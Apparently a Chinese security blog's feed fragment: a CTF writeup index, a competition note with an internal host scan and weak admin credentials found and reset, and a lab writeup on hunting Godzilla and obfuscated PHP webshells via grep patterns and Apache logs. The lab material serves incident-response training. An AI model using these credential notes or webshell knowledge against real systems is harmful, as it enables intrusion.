class="headerlink" title="WP"></a>WP</h2><h3 id="2025"><a href="#2025" class="headerlink" title="2025"></a><a href="WP/2025/index.md">2025</a></h3><ul><li><a href="WP/2025/%E9%95%BF%E5%9F%8E%E6%9D%AF.md">长城杯</a></li><li><a href="WP/2025/%E6%8B%9B%E5%95%86%E8%BD%A6%E8%BE%86%E6%B5%8B%E8%AF%95-Polis.md">招商车辆测试-Polis</a></li><li><a href="WP/2025/%E6%B9%BE%E5%8C%BA%E6%9D%AF%E6%8A%A5%E5%90%8D.md">湾区杯报名</a></li></ul><h4 id="陇剑杯报名"><a href="#陇剑杯报名" class="headerlink" title="陇剑杯报名"></a><a href="WP/2025/%E9%99%87%E5%89%91%E6%9D%AF%E6%8A%A5%E5%90%8D/index.md">陇剑杯报名</a></h4><ul><li><a href="WP/2025/%E9%99%87%E5%89%91%E6%9D%AF%E6%8A%A5%E5%90%8D/%E5%88%9D%E8%B5%9B.md">初赛</a></li></ul><h4 id="上海市赛"><a href="#上海市赛" class="headerlink" title="上海市赛"></a><a href="WP/2025/%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B/index.md">上海市赛</a></h4><ul><li><a href="WP/2025/%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B/%E5%A4%8D%E8%B5%9Bwp.md">复赛wp</a></li><li><a href="WP/2025/%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B/%E5%88%9D%E8%B5%9Bwp.md">初赛wp</a></li><li><a href="WP/2025/l3hCTF.md">l3hCTF</a></li></ul><h4 id="代练"><a href="#代练" class="headerlink" title="代练"></a><a href="WP/2025/%E4%BB%A3%E7%BB%83/index.md">代练</a></h4><ul><li><a href="WP/2025/%E4%BB%A3%E7%BB%83/8.20.md">8.20</a></li><li><a href="WP/2025/%E4%BB%A3%E7%BB%83/MISC.md">MISC</a></li><li><a href="WP/2025/%E9%80%86%E5%90%91%E5%8D%81%E9%81%93%E9%A2%98.md">逆向十道题</a></li><li><a href="WP/2025/%E6%A0%A1%E8%B5%9B.md">校赛</a></li></ul><h4 id="iscc"><a href="#iscc" class="headerlink" title="iscc"></a><a href="WP/2025/iscc/index.md">iscc</a></h4><ul><li><a href="WP/2025/iscc/iscc%E5%8C%BA%E5%9F%9F%E8%B5%9B.md">iscc区域赛</a></li><li><a href="WP/2025/jlctf.md">jlctf</a></li><li><a href="WP/2025/jiya%E7%9A%84%E8%80%83%E9%AA%8C.md">jiya的考验</a></li><li><a href="WP/2025/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%EF%BC%8810%E9%A2%98%EF%BC%89.md">逆向工程（10题）</a></li></ul><h3 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h3><ul><li><a href="WP/2024/12.15%E5%9B%BD%E8%B5%9B.md">12.15国赛</a></li><li><a href="WP/2024/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Alkiad.md">极客大挑战-Alkiad</a></li><li><a href="WP/2024/%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0.md">省赛初赛复现</a></li><li><a href="WP/2024/11.2%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B.md">11.2省赛初赛</a></li><li><a href="WP/2024/%E7%9C%81%E8%B5%9B.md">省赛</a></li><li><a href="WP/2024/%E7%BD%91%E9%BC%8E%E6%9D%AF10.29%E5%89%8D.md">网鼎杯10.29前</a></li><li><a href="WP/2024/0xGame2024.md">0xGame2024</a></li><li><a href="WP/2024/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%9F%BA%E7%A1%80%EF%BC%8815%EF%BC%89.md">信息安全竞赛基础（15）</a></li><li><a href="WP/2024/BASEctf.md">BASEctf</a></li><li><a href="WP/2024/MOECTF.md">MOECTF</a></li><li><a href="WP/2024/%E6%9A%91%E5%81%87%E5%86%85%E9%83%A8%E8%B5%9B.md">暑假内部赛</a></li><li><a href="WP/2024/CTFSHOW%E8%8F%9C%E7%8B%97%E6%9D%AF.md">CTFSHOW菜狗杯</a></li><li><a href="WP/2024/6.1%E6%A0%A1%E8%B5%9B.md">6.1校赛</a></li><li><a href="WP/2024/5.18%E5%9B%BD%E8%B5%9B.md">5.18国赛</a></li><li><a href="WP/2024/Polis_wp%E5%A4%A7%E4%B8%80%E4%B8%8B%E9%9B%86%E8%AE%AD.md">Polis_wp大一下集训</a></li></ul><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E9%93%B8%E5%89%91%E6%9D%AF/wp/"/>
    <url>/2026/01/19/%E9%93%B8%E5%89%91%E6%9D%AF/wp/</url>
    
    <content type="html"><![CDATA[<h1 id="初次扫描"><a href="#初次扫描" class="headerlink" title="初次扫描"></a>初次扫描</h1><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">WebTitle</span>:<span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.31         code:200 len:18     title:教务系统登录</span><br>已完成 <span class="hljs-number">1</span>/<span class="hljs-number">1</span><br><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">WebTitle</span>:<span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.32         code:200 len:72668  title:天气预报</span><br>已完成 <span class="hljs-number">1</span>/<span class="hljs-number">1</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.33 Get &quot;http://10.1.30.33&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.34 Get &quot;http://10.1.30.34&quot;: dial tcp 10.1.30.34:80: connectex: No connection could be made because the target machine actively refused it.</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.35 Get &quot;http://10.1.30.35&quot;: dial tcp 10.1.30.35:80: connectex: No connection could be made because the target machine actively refused it.</span><br><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">WebTitle</span>:<span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.36         code:200 len:39     title:欢迎使用禅道集成运行环境！</span><br>已完成 <span class="hljs-number">1</span>/<span class="hljs-number">1</span><br><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">WebTitle</span>:<span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.37         code:200 len:9      title:FortiGate</span><br>已完成 <span class="hljs-number">1</span>/<span class="hljs-number">1</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.38 Get &quot;http://10.1.30.38&quot;: dial tcp 10.1.30.38:80: connectex: No connection could be made because the target machine actively refused it.</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.39 Get &quot;http://10.1.30.39&quot;: dial tcp 10.1.30.39:80: connectex: No connection could be made because the target machine actively refused it.</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.40 Get &quot;http://10.1.30.40&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span><br><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">WebTitle</span>:<span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.41         code:302 len:134    title:对象已移动</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">WebTitle</span>:<span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.41/broadWeb/bwRoot.asp?username=admin code:200 len:32     title:Advantech WebAccess Welcome Page</span><br>已完成 <span class="hljs-number">1</span>/<span class="hljs-number">1</span><br><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">WebTitle</span>:<span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.42         code:302 len:203    title:302 Found</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">WebTitle</span>:<span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//10.1.30.42/       code:200 len:1436   title:Viewplanner</span><br>已完成 <span class="hljs-number">1</span>/<span class="hljs-number">1</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.43 Get &quot;http://10.1.30.43&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.44 Get &quot;http://10.1.30.44&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span><br><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">WebTitle</span>:<span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.45         code:200 len:0      title:None</span><br>已完成 <span class="hljs-number">1</span>/<span class="hljs-number">1</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.46 Get &quot;http://10.1.30.46&quot;: dial tcp 10.1.30.46:80: connectex: No connection could be made because the target machine actively refused it.</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.47 Get &quot;http://10.1.30.47&quot;: dial tcp 10.1.30.47:80: connectex: No connection could be made because the target machine actively refused it.</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.48 Get &quot;http://10.1.30.48&quot;: dial tcp 10.1.30.48:80: connectex: No connection could be made because the target machine actively refused it.</span><br><br>已完成 <span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">webtitle</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//10.1.30.49 Get &quot;http://10.1.30.49&quot;: dial tcp 10.1.30.49:80: connectex: No connection could be made because the target machine actively refused it.</span><br></code></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts">有登录页面<br><span class="hljs-symbol">http:</span><span class="hljs-comment">//10.1.30.31  </span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//10.1.30.36</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//10.1.30.41</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//10.1.30.42/admin/#/user/login</span><br>[管伊佳ERP](http:<span class="hljs-comment">//10.1.30.45/)</span><br><br><br></code></pre></td></tr></table></figure><p>10.1.30.45<br>拿到admin&#x2F;123456<br>重置密码 admin&#x2F;Polis233<br>测试用户 jsh&#x2F;123456 重置密码</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
    <url>/2026/01/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h1 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="步骤1-1（木马路径）"><a href="#步骤1-1（木马路径）" class="headerlink" title="步骤1.1（木马路径）"></a>步骤1.1（木马路径）</h3><p>&#x2F;&#x2F;搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征</p><p>find .&#x2F; type f -name “*.jsp” | xargs grep “exec(“ </p><p>find .&#x2F; type f -name “*.php” | xargs grep “eval(“ </p><p>find .&#x2F; type f -name “*.asp” | xargs grep “execute(“ </p><p>find .&#x2F; type f -name “*.aspx” | xargs grep “eval(“ </p><p>&#x2F;&#x2F;对于免杀Webshell，可以查看是否使用编码</p><p>find .&#x2F; type f -name “*.php” | xargs grep “base64_decode” </p><p>这边查到了有异地登录ip，</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748419971001-2dd4d6cd-00a1-49f0-9d5e-c24fe0e6d294-548307.png" alt="1748419971001-2dd4d6cd-00a1-49f0-9d5e-c24fe0e6d294.png"></p><p>find .&#x2F; type f -name “*.php” | xargs grep “eval(“ </p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748420254556-13aa09b0-9d06-4ac9-bb6a-55e0126323c5-325053.png" alt="1748420254556-13aa09b0-9d06-4ac9-bb6a-55e0126323c5.png"></p><p> cat .&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;gz.php</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748420345979-8791a578-2eb3-411d-87e5-1abce136beb0-674913.png" alt="1748420345979-8791a578-2eb3-411d-87e5-1abce136beb0.png"></p><p>找到webshell里面的flag</p><p>027ccd04-5065-48b6-a32d-77c704a5e26d</p><p>简单分析一下这段恶意代码；</p><p>@session_start();：启动会话</p><p>@set_time_limit(0);：设置脚本执行时间限制为无限制</p><p>@error_reporting(0);：关闭错误报告</p><p>function encode($D,$K){…}：定义了一个名为 encode 的函数，它接受两个参数 $D 和 $K。这个函数看起来像是一个简单的异或编码函数，用于对数据进行加密或解密。它使用 $K 作为密钥，对 $D 中的每个字符进行异或操作。</p><p>接下来的几行代码定义了 $payloadName、$key 和 $data 变量。$payloadName 是用于存储有效载荷的会话变量名，$key 是用于编码的密钥，$data 是从 php:&#x2F;&#x2F;input 流中读取的数据。</p><p>if ($data!&#x3D;&#x3D;false){…}：如果从 php:&#x2F;&#x2F;input 读取的数据不是 false（即成功读取了数据），则执行以下代码块。</p><p>if (isset($_SESSION[$payloadName])){…}：检查 $payloadName 对应的会话变量是否已设置。</p><p>if (strpos($payload,”getBasicsInfo”)&#x3D;&#x3D;&#x3D;false){…}：检查 $payload 变量中是否包含字符串 “getBasicsInfo”。</p><p>eval($payload);：如果 $payload 变量包含 “getBasicsInfo” 字符串，则执行 $payload 变量中的 PHP 代码。</p><p>echo encode(@run($data),$key);：如果 $data 包含 “getBasicsInfo” 字符串，则执行 @run($data) 函数，并将结果编码后输出。</p><p>总结：</p><p>这段代码的目的是接收通过 php:&#x2F;&#x2F;input 流发送的数据，对其进行编码，并根据会话变量中的内容执行特定的 PHP 代码。这通常用于隐藏恶意代码或后门，使得攻击者可以通过特定的请求触发执行。</p><h3 id="步骤1-2-哥斯拉木马"><a href="#步骤1-2-哥斯拉木马" class="headerlink" title="步骤1.2(哥斯拉木马)"></a>步骤1.2(哥斯拉木马)</h3><p>其实开头三句就可以分析出是godzilla的webshell了；</p><p>为什么这样说？</p><p>哥斯拉病毒是一种Java后门木马，通常用于攻击并控制Web服务器。特征就包括：</p><p>@session_start(); - 开启一个会话。</p><p>@set_time_limit(0); - 设置脚本执行时间为无限。</p><p>@error_reporting(0); - 关闭所有错误报告。</p><p><font style="color:rgb(77, 77, 77);">这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。</font></p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748420801486-dbc3285f-1dea-4e64-8af5-3620b6f78168-336646.png" alt="1748420801486-dbc3285f-1dea-4e64-8af5-3620b6f78168.png"></p><p>md5加密<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a>（大写）</p><h3 id="步骤1-3-隐藏马"><a href="#步骤1-3-隐藏马" class="headerlink" title="步骤1.3(隐藏马)"></a>步骤1.3(隐藏马)</h3><p><font style="color:rgb(77, 77, 77);">那既然说黑客隐藏shell了，那我们肯定需要用到命令ls -la进行查找；</font></p><p><font style="color:rgb(77, 77, 77);">然后发现在挨个查找的过程中发现.Mysqlli.php如果普通的ls查看目录是查不出来的，必须用到ls -la才行，所以它就是隐藏了，我们直接定位一些它的路径，进行MD5加密即可；</font></p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748421389170-399d867d-fb9b-4ab9-badb-102bd621e70e-530393.png" alt="1748421389170-399d867d-fb9b-4ab9-badb-102bd621e70e.png"></p><p>vim看一下果然是木马</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748421413548-58671f2a-7fe8-43e7-8406-68b4502c358b-901358.png" alt="1748421413548-58671f2a-7fe8-43e7-8406-68b4502c358b.png"></p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.php</p><p>AEBAC0E58CD6C5FAD1695EE4D1AC1919</p><h3 id="步骤1-4（免杀马）"><a href="#步骤1-4（免杀马）" class="headerlink" title="步骤1.4（免杀马）"></a>步骤1.4（免杀马）</h3><p>什么是免杀马？</p><p>免杀马（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。</p><p>常见的免杀技术；</p><p>代码混淆：</p><p>使用混淆工具或手动混淆代码，使其难以被直接阅读和分析。</p><p>编码和加密：</p><p>使用Base64、ROT13等编码方式或更复杂的加密技术隐藏恶意代码片段。</p><p>动态生成和执行：</p><p>通过动态生成代码并在运行时执行，绕过静态分析。例如，使用 eval()、create_function() 等PHP函数。</p><p>多层解码：</p><p>多层编码或加密，增加分析和检测的难度。</p><p>使用合法函数：</p><p>恶意代码嵌入到看似合法的代码中，利用正常的函数调用执行恶意操作。</p><p>查找和处理免杀马的方法；</p><p>文件完整性检查：</p><p>比较当前文件与已知的良性备份文件，发现被修改或新增的文件。</p><p>代码审查：</p><p>手动检查可疑文件，寻找混淆、编码、加密和动态执行的代码模式。</p><p>安全扫描工具：</p><p>使用高级安全扫描工具，这些工具使用行为分析和机器学习来检测潜在的免杀马。</p><p>日志分析：</p><p>查看服务器访问日志和错误日志，寻找异常访问和执行模式。</p><p>检查文件修改时间，与正常更新周期不符的文件可能是可疑的。</p><p>基于特征的检测：</p><p>使用YARA规则等特征检测工具，根据已知的免杀马特征进行扫描。</p><p>总结：免杀马通过静态检测是检测不到的，因为在免杀的过程中将webshel的特征值以及特征函数都给去掉了，因为webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录，这里也顺便说一下linux的日志存放在&#x2F;var&#x2F;log目录下。</p><p>这里我们总结一下常见网站日志的路径：</p><p>IIS（Internet Information Services）</p><p>IIS是Windows上的默认Web服务器，其日志文件默认存储在以下路径：</p><p>IIS 6.0 及更早版本：</p><p>C:\WINDOWS\system32\LogFiles\W3SVC[SiteID]\</p><p>IIS 7.0 及更高版本：</p><p>C:\inetpub\logs\LogFiles\W3SVC[SiteID]\</p><p>其中，[SiteID] 是网站的标识符，通常是一个数字。</p><p>Apache HTTP Server</p><p>如果在Windows上安装了Apache，日志文件默认存储在安装目录下的logs文件夹中：</p><p>C:\Program Files (x86)\Apache Group\Apache2\logs\</p><p>或者</p><p>C:\Program Files\Apache Group\Apache2\logs\</p><p>具体路径取决于安装时选择的位置。</p><p>Linux系统中的网站日志路径</p><p>Apache HTTP Server</p><p>在Linux上，Apache日志文件通常位于以下目录：</p><p>访问日志：</p><p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p><p>或者</p><p>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</p><p>错误日志：</p><p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</p><p>或</p><p>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log</p><p>不同的Linux发行版可能有不同的目录。例如，在Debian&#x2F;Ubuntu上通常使用&#x2F;var&#x2F;log&#x2F;apache2&#x2F;，而在Red Hat&#x2F;CentOS上通常使用&#x2F;var&#x2F;log&#x2F;httpd&#x2F;。</p><p>Nginx</p><p>Nginx是另一个流行的Web服务器，默认的日志文件路径如下：</p><p>访问日志：</p><p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>错误日志：</p><p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>如何查看和分析日志文件？</p><p>Windows：</p><p>使用文本编辑器（如Notepad、Notepad++）直接打开日志文件查看。</p><p>可以使用IIS管理器查看IIS日志。</p><p>Linux：</p><p>使用命令行工具查看日志，例如：</p><p>tail -f &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log tail -f &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>可以使用日志分析工具（如GoAccess、AWStats）生成可视化的日志报告。</p><p>既然它经过了免杀处理，那么木马的特征值以及特征函数应该都是被去掉了。这时我们再通过静态检测是基本检测不到的，从上面我们就可以看出我们只找到了三个马。而且上面我们说了webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录。</p><p>去var&#x2F;log</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748421907313-939d41e7-eb1f-414f-a686-e166c08c5e52-810707.png" alt="1748421907313-939d41e7-eb1f-414f-a686-e166c08c5e52.png"></p><p>下面的apache2</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748421931220-f3160c41-dce3-4bf5-a67e-839e0fec2fb3-325887.png" alt="1748421931220-f3160c41-dce3-4bf5-a67e-839e0fec2fb3.png"></p><p>cat access.log看一下</p><p>在找你妹的游戏中主播获胜</p><p>phpinfo 你想干什么</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748422026155-fba171aa-f8a9-4e54-a511-6d4ff46c1f8b-683216.png" alt="1748422026155-fba171aa-f8a9-4e54-a511-6d4ff46c1f8b.png"></p><p>在&#x2F;var&#x2F;www&#x2F;html&#x2F;wap</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748422147146-c5b55d08-e5b3-4aa4-810c-6cf66dc3f995-221852.png" alt="1748422147146-c5b55d08-e5b3-4aa4-810c-6cf66dc3f995.png"></p><p>看一下</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748422226069-8941f031-53c0-4b3d-a1f6-04330393217e-638121.png" alt="1748422226069-8941f031-53c0-4b3d-a1f6-04330393217e.png"></p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;wap&#x2F;top.php</p><p>EEFF2EABFD9B7A6D26FC1A53D3F7D1DE</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="查看是否上传shell-命令"><a href="#查看是否上传shell-命令" class="headerlink" title="查看是否上传shell 命令"></a>查看是否上传shell 命令</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征<br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.jsp&quot;</span> | xargs grep <span class="hljs-string">&quot;exec(&quot;</span> <br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span> <br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.asp&quot;</span> | xargs grep <span class="hljs-string">&quot;execute(&quot;</span> <br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.aspx&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span> <br> <br>//对于免杀Webshell，可以查看是否使用编码<br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;base64_decode&quot;</span> <br></code></pre></td></tr></table></figure><h3 id="哥斯拉木马特征"><a href="#哥斯拉木马特征" class="headerlink" title="哥斯拉木马特征"></a>哥斯拉木马特征</h3><p>哥斯拉病毒是一种Java后门木马，通常用于攻击并控制Web服务器。特征就包括：</p><p>@session_start(); - 开启一个会话。</p><p>@set_time_limit(0); - 设置脚本执行时间为无限。</p><p>@error_reporting(0); - 关闭所有错误报告。</p><h3 id="隐藏马-使用ls-la-看不同"><a href="#隐藏马-使用ls-la-看不同" class="headerlink" title="隐藏马 使用ls -la 看不同"></a>隐藏马 使用ls -la 看不同</h3><p>看 var&#x2F;www&#x2F;html</p><h3 id="免杀马"><a href="#免杀马" class="headerlink" title="免杀马"></a>免杀马</h3><p>去看服务日志</p><p>在Linux上，Apache日志文件通常位于以下目录：</p><p>访问日志：</p><p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p><p>或者</p><p>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</p><p>错误日志：</p><p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</p><p>或</p><p>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log</p><h1 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a><strong>Linux日志分析</strong></h1><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p><font style="color:rgb(17, 17, 17);">在Linux系统中，日志文件通常存储在</font><em><strong><font style="color:rgb(68, 68, 68);background-color:rgb(249, 249, 249);">&#x2F;var&#x2F;log</font></strong></em><font style="color:rgb(17, 17, 17);">目录下。这个目录包含了系统运行过程中产生的各种日志文件，这些日志文件对于系统的维护和故障排除非常重要。以下是一些常见的日志文件及其用途：</font></p><ul><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;messages</font></strong><font style="color:rgb(17, 17, 17);">：包含整体系统信息，包括系统启动期间的日志。此外，邮件、cron、守护进程、内核和授权等内容也记录在此文件中</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;dmesg</font></strong><font style="color:rgb(17, 17, 17);">：包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用</font><em><strong><font style="color:rgb(68, 68, 68);background-color:rgb(249, 249, 249);">dmesg</font></strong></em><font style="color:rgb(17, 17, 17);">命令查看它们</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:#DF2A3F;">&#x2F;var&#x2F;log&#x2F;auth.log</font></strong><font style="color:#DF2A3F;">：包含系统授权信息，包括用户登录和使用的权限机制等</font><a 